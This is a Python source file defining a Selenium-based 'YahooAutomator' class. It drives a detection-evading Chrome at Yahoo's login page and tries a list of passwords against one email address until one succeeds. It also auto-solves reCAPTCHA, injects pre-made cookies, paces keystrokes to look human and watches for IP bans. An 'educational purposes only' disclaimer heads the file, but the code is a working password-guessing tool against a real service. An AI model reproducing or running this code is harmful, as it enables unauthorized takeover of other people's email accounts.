"""
*******************************************************************************
                       WARNING: USE THIS TOOL RESPONSIBLY
*******************************************************************************

This YahooAutomator tool, developed by Abdul Moez, is intended for educational purposes only and should be used
responsibly and ethically. The tool automates the Yahoo login process, providing functionality to log in to a
Yahoo account using provided credentials, handle various challenges like CAPTCHA,
and interact with the Yahoo login page.

By using this tool, you acknowledge and agree to the following:

1. Educational Purpose Only:
   This tool is meant for educational purposes, helping individuals understand web automation and
   the challenges involved in automating login processes.

2. Not for Malicious Activities:
   Do not use this tool for any malicious or harmful activities, including but not limited to unauthorized
   access, data theft, or any actions that violate the law or Yahoo's terms of service.

3. Responsibility:
   The author, Abdul Moez, is not responsible for any misuse, damage, or legal consequences resulting from
   the use of this tool. Users are solely responsible for their actions.

4. User Accountability:
   Users of this tool should exercise caution, adhere to legal and ethical standards, and respect the
   privacy and rights of others. Any consequences arising from misuse will be the user's responsibility.

5. No Warranty:
   This tool comes with no warranty. The author provides no guarantees regarding its performance,
   accuracy, or suitability for any specific purpose.

6. Report Security Issues:
   If you discover any security vulnerabilities or issues related to this tool,
   please responsibly disclose them to the author.

7. Author information:
   - author: Abdul Moez
   - version: 0.1
   - study: Undergraduate at GCU Lahore, Pakistan

Remember that unauthorized access to accounts or systems is illegal and unethical. Use this tool responsibly,
respecting the principles of cybersecurity and privacy.

*******************************************************************************
"""

from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.common.action_chains import ActionChains
from undetected_chromedriver import Chrome, ChromeOptions
from selenium.webdriver.chrome.webdriver import WebDriver
from utils.exceptions import RecaptchaException
from selenium.webdriver.common.by import By
from utils.solver import RecaptchaSolver
from utils.pprints import PPrints
import chromedriver_autoinstaller
from os import path, makedirs
from pickle import load
from time import sleep
from re import search


class YahooAutomator(object):
    """
    YahooAutomator is a class designed for automating the Yahoo login process. It provides functionality to log in
    to a Yahoo account using provided credentials, handle various challenges like CAPTCHA, and interact with the
    Yahoo login page.

    Attributes:
        __TARGET_SITE (str): The target URL for Yahoo login.
        __class_new_account (str): Selector for the 'Create New Account' link.
        __class_password_error (str): Selector for the element displaying password-related errors.
        __class_unexpected_error (str): Selector for the element displaying unexpected errors.
        __id_username (str): Selector for the username input field.
        __id_password (str): Selector for the password input field.
        __id_banned_time (str): Selector for the element displaying the time remaining for a first-time ban.
        __id_captcha_submit_btn (str): Selector for the reCAPTCHA submit button.
        __id_password_signin (str): Selector for the 'Sign In' button after entering the password.
        __name_email_signin (str): Selector for the 'Sign In' button after entering the email.
        __css_recaptcha_iframe_1 (str): CSS selector for the first reCAPTCHA iframe.
        __xpath_recaptcha_iframe_2 (str): XPath selector for the second reCAPTCHA iframe.
        __banned_time_exp (str): Regular expression for extracting remaining time from a ban message.

    Methods:
        __init__(self, profile_dir: str, predefined_cookies: str, estimated_wait: int = 10, short_wait: int = 5,
                 verbose: bool = True, headless_mode: bool = False) -> None:
            Initializes the YahooAutomator object.

        correct_password(self) -> str:
            Returns the correct password used for a successful login.

        __pprints_override(self, status: str, logs: bool = False) -> None:
            Overrides and prints status messages using the PPrints class.

        __created_patched_driver(self) -> WebDriver:
            Creates and returns a patched WebDriver for interacting with the browser.

        get_browser(self) -> WebDriver:
             Get the WebDriver object for the current browser session.

        __validate_directories(self) -> None:
            Validates the existence of the profile directory and creates it if necessary.

        __skip_old_login_page(self) -> None:
             Skip the old Yahoo login page if present.

        __insert_email(self, email: str, pace: float = .5) -> bool:
            Inserts the Yahoo email address into the login form.

        __check_yahoo_first_time_ban(self) -> tuple[bool, str]:
            Checks if the Yahoo account is first-time banned.

        __solve_captcha(self) -> tuple[bool, str]:
            Solves the reCAPTCHA challenge if present.

        __insert_password(self, password: str, pace: float = 0.5) -> bool:
            Inserts the password into the login form.

        __is_password_correct(self) -> bool:
            Checks if the last entered password is correct.

        __is_unexpected_error(self) -> tuple[bool, str]:
            Checks if there is an unexpected error during the login process.

        login_to_yahoo(self, yahoo_mail: str, passwords_combo: list[str], first_run: bool = True,
                       pace: float = 0.5) -> tuple[bool, str]:
            Logs in to a Yahoo account using provided credentials.
    """

    __TARGET_SITE: str = "https://login.yahoo.com/"

    # selectors
    __class_new_account: str = "bottom-cta"
    __class_password_error: str = "error-msg"
    __class_unexpected_error: str = "notification-error"
    __id_username: str = "login-username"
    __id_password: str = "login-passwd"
    __id_banned_time: str = "wait-challenge"
    __id_captcha_submit_btn: str = "recaptcha-submit"
    __id_password_signin: str = "login-signin"
    __name_email_signin: str = "signin"
    __css_recaptcha_iframe_1: str = 'iframe[id="recaptcha-iframe"]'
    __xpath_recaptcha_iframe_2: str = '//iframe[@title="reCAPTCHA"]'

    # regular expressions
    __banned_time_exp: str = r"Try again in (\d+) minutes"

    def __init__(self, profile_dir: str, predefined_cookies: str, estimated_wait: int = 10, short_wait: int = 5,
                 verbose: bool = True, headless_mode: bool = False) -> None:
        """
        Initialize the YahooAutomator object.

        Parameters:
            - profile_dir (str): Path to the profile directory.
            - predefined_cookies (str): Path to the file containing predefined cookies.
            - estimated_wait (int): Estimated wait time for various actions.
            - short_wait (int): Short wait time for specific actions.
            - verbose (bool): Enable verbose mode for printing status messages.
            - headless_mode (bool): Run the browser in headless mode.

        Returns:
            None
        """

        self.__mode: str = "Headless" if headless_mode else "Windowed"
        self.__current_driver: any([None, WebDriver]) = None
        self.__predefined_cookies: str = predefined_cookies
        self.__estimated_wait: int = estimated_wait
        self.__headless: bool = headless_mode
        self.__profile_dir: str = profile_dir
        self.__short_wait: int = short_wait
        self.__pprints: PPrints = PPrints()
        self.__verbose: bool = verbose
        self.__validate_directories()
        self.__founded_password: str = ""

    def __validate_directories(self):
        """
        Validate the existence of the profile directory and create it if necessary.
        Returns:
           None
        """

        profile_dir: str = path.abspath(self.__profile_dir)
        makedirs(name=profile_dir, exist_ok=True)

    @property
    def correct_password(self) -> str:
        """
        Get the correct password used for successful login.

        Returns:
            str: Correct password.
        """

        return self.__founded_password

    def __pprints_override(self, status: str, logs: bool = False) -> None:
        """
        Override and print status messages using PPrints class.

        Parameters:
            - status (str): Status message to be printed.
            - logs (bool): Flag indicating whether to print logs.

        Returns:
            None
        """

        if self.__verbose:
            self.__pprints.pretty_print(status=status, mode=self.__mode, logs=logs)

    def __created_patched_driver(self) -> WebDriver:
        """
        Create and return a patched WebDriver for interacting with the browser.
        Returns:
            WebDriver: The patched WebDriver object.
        """

        self.__pprints_override(status="Initializing patched browser")
        version_main = int(chromedriver_autoinstaller.get_chrome_version().split(".")[0])
        profile_dir: str = path.abspath(self.__profile_dir)
        options = ChromeOptions()
        options.add_argument('--allow-running-insecure-content')
        options.add_argument(f'--user-data-dir={profile_dir}')
        options.add_argument('--ignore-certificate-errors')
        options.add_argument("--disable-notifications")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-infobars")
        if self.__headless:
            driver = Chrome(options=options, enable_console_log=False, enable_logging=False,
                            version_main=version_main, headless=True)
        else:
            driver = Chrome(options=options, enable_console_log=False, enable_logging=False,
                            version_main=version_main)
        return driver

    def get_browser(self) -> WebDriver:
        """
        Get the WebDriver object for the current browser session.
        Returns:
            WebDriver: The WebDriver object.
        """

        if not self.__current_driver:
            self.__current_driver = self.__created_patched_driver()
        return self.__current_driver

    def __skip_old_login_page(self) -> None:
        """
        Skip the old Yahoo login page if present.
        Returns:
            None
        """

        try:
            self.__current_driver.find_element(By.CLASS_NAME, self.__class_new_account).click()
        except NoSuchElementException:
            ...

    def __insert_email(self, email: str, pace: float = .5) -> bool:
        """
        Insert the Yahoo email address into the login form.

        Parameters:
            - email (str): Yahoo email address.
            - pace (float): Typing pace for entering characters.

        Returns:
            bool: True if successful, False otherwise.
        """

        self.__pprints_override(status=f"Performing email address operation on: {email}")
        actions: ActionChains = ActionChains(driver=self.__current_driver)
        try:
            email_block = self.__current_driver.find_element(by=By.ID, value=self.__id_username)
            email_block.click()
        except NoSuchElementException:
            return False
        for char in email:
            actions.send_keys(char)
            actions.perform()
            sleep(pace)
        sleep(.4)
        try:
            self.__current_driver.find_element(by=By.NAME, value=self.__name_email_signin).click()
        except NoSuchElementException:
            return False
        sleep(self.__short_wait)
        return True

    def __check_yahoo_first_time_ban(self) -> tuple[bool, str]:
        """
        Check if the Yahoo account is first-time banned.

        Returns:
            tuple[bool, str]: Tuple indicating ban status and status message.
        """

        self.__pprints_override(status="Checking yahoo ban traces")
        try:
            banned_timer_text: str = self.__current_driver.find_element(by=By.ID, value=self.__id_banned_time).text
            ban_remaining_time: any([None, str]) = search(pattern=self.__banned_time_exp, string=banned_timer_text)
            if ban_remaining_time:
                minutes = int(ban_remaining_time.group(1))
                error_text: str = f"Your ip has been baned and unblock after: {minutes} minutes."
                self.__pprints_override(status=error_text)
                return False, error_text
            else:
                return False, banned_timer_text
        except NoSuchElementException:
            return True, ""

    def __solve_captcha(self) -> tuple[bool, str]:
        """
        Solve the reCAPTCHA challenge if present.

        Returns:
            tuple[bool, str]: Tuple indicating a success status and status message.
        """

        self.__pprints_override(status="Checking for captcha")
        try:
            captcha_block_iframe = self.__current_driver.find_element(by=By.CSS_SELECTOR,
                                                                      value=self.__css_recaptcha_iframe_1)
            self.__current_driver.switch_to.frame(frame_reference=captcha_block_iframe)
            recaptcha_iframe = self.__current_driver.find_element(by=By.XPATH, value=self.__xpath_recaptcha_iframe_2)
            captcha_solver = RecaptchaSolver(driver=self.__current_driver)
            try:
                captcha_solver.click_recaptcha_v2(iframe=recaptcha_iframe)
            except TimeoutException:
                return True, ""
            except RecaptchaException:
                self.__current_driver.switch_to.default_content()
                return False, "Recaptcha solver is detected"
            self.__current_driver.switch_to.default_content()
            try:
                self.__current_driver.find_element(by=By.ID, value=self.__id_captcha_submit_btn).click()
            except NoSuchElementException:
                return False, "Does not able to find captcha submit button"
            return True, ""
        except NoSuchElementException:
            return True, ""

    def __insert_password(self, password: str, pace: float = 0.5) -> bool:
        """
        Insert the password into the login form.

        Parameters:
            - password (str): Password to be entered.
            - pace (float): Typing pace for entering characters.

        Returns:
            bool: True if successful, False otherwise.
        """

        self.__pprints_override(status=f"Performing password address operation on: {password}")
        actions: ActionChains = ActionChains(driver=self.__current_driver)
        try:
            password_block = self.__current_driver.find_element(by=By.ID, value=self.__id_password)
            password_block.click()
        except NoSuchElementException:
            return False
        for char in password:
            actions.send_keys(char)
            actions.perform()
            sleep(pace)
        sleep(.4)
        try:
            self.__current_driver.find_element(by=By.ID, value=self.__id_password_signin).click()
        except NoSuchElementException:
            return False
        sleep(self.__short_wait - 2 if self.__short_wait - 3 > 0 else 2)
        return True

    def __is_password_correct(self) -> bool:
        """
        Check if the last-entered password is correct.

        Returns:
            bool: True if correct, False otherwise.
        """

        self.__pprints_override(status="Checking if last password is correct")
        try:
            error_message: str = self.__current_driver.find_element(by=By.CLASS_NAME,
                                                                    value=self.__class_password_error).text.strip()
            if "invalid password" in error_message.lower():
                return False
            return True
        except NoSuchElementException:
            return True

    def __is_unexpected_error(self) -> tuple[bool, str]:
        """
        Check if there is an unexpected error during the login process.

        Returns:
            tuple[bool, str]: Tuple indicating error status and error message.
        """

        try:
            error_notification: str = self.__current_driver.find_element(
                by=By.CLASS_NAME, value=self.__class_unexpected_error
            ).text.strip()
            return True, f"Unsolvable error: {error_notification}"
        except NoSuchElementException:
            return False, ""

    def login_to_yahoo(self, yahoo_mail: str, passwords_combo: list[str], first_run: bool = True,
                       pace: float = 0.5) -> tuple[bool, str]:
        """
        Log in to a Yahoo account using provided credentials.
        Parameters:
            - yahoo_mail (str): Yahoo email address.
            - passwords_combo (list[str]): List of passwords to try.
            - first_run (bool): Flag indicating if it's the first run.
            - pace (float): Typing pace for email and password.
        Returns:
            tuple[bool, str]: Tuple indicating a success status and status message.
        """

        if not self.__current_driver:
            self.__current_driver = self.__created_patched_driver()

        self.__current_driver.get(url=self.__TARGET_SITE)
        if first_run:
            self.__pprints_override(status="Loading predefined cookies")
            pre_defined_cookies = load(file=open(self.__predefined_cookies, 'rb'))
            for cookie in pre_defined_cookies:
                self.__current_driver.add_cookie(cookie)
            self.__current_driver.refresh()
        self.__skip_old_login_page()
        sleep(self.__estimated_wait)
        if not self.__insert_email(email=yahoo_mail, pace=pace):
            return False, "An error occurred while performing the email entering function."

        ban_status: tuple[bool, str] = self.__check_yahoo_first_time_ban()
        if not ban_status[0]:
            return ban_status
        captcha_checks: tuple[bool, str] = self.__solve_captcha()
        if not captcha_checks[0]:
            return captcha_checks

        for password in passwords_combo:
            sleep(self.__short_wait - 3 if self.__short_wait - 3 > 0 else 2)
            if not self.__insert_password(password=password, pace=pace):
                return False, "An error occurred while performing the password entering function."
            if self.__is_password_correct():
                self.__pprints_override(status=f"Password matched; account is logged in using: {password}")
                self.__founded_password = password
                return True,  f"Password matched; account is logged in using: {password}"
            unexpected_error: tuple[bool, str] = self.__is_unexpected_error()
            if unexpected_error[0]:
                self.__pprints_override(status=unexpected_error[1])
                return False, unexpected_error[1]
            captcha_checks: tuple[bool, str] = self.__solve_captcha()
            if not captcha_checks[0]:
                return captcha_checks
